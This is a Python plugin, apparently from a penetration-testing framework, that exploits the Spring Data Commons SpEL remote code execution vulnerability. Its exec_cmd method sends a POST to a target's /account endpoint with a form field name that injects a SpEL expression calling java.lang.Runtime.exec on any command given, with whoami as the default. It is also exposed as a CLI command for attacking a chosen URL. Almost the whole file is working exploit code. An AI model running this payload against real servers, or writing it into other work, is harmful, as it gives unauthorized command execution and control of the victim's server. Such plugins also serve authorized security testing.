# -*-* coding:UTF-8
import re
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "Spring Data Commons远程代码执行漏洞",
        "description": "Spring Data Commons组件中存在远程代码执行漏洞，攻击者可构造包含有恶意代码的SPEL表达式实现远程代码攻击，直接获取服务器控制权限。",
        "references": ["-"],
    }

    def url(self) -> dict:
        res = self.exec_cmd(self.target.url, 'whoami')
        if res:
            return {"LoopholeInfo": self.__info__}

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def exec_cmd(self, url, cmd):
        self.log.info(f"利用{self.__info__['name']}执行命令无回显")
        r = self.request(
            method='POST',
            url=urllib.parse.urljoin(url, './account '),
            data=f"name[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('{cmd}')]=test",
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            timeout=15,
        )
        if r.status_code == 500 and 'java.lang.String' in r.text:
            return True
        else:
            return False
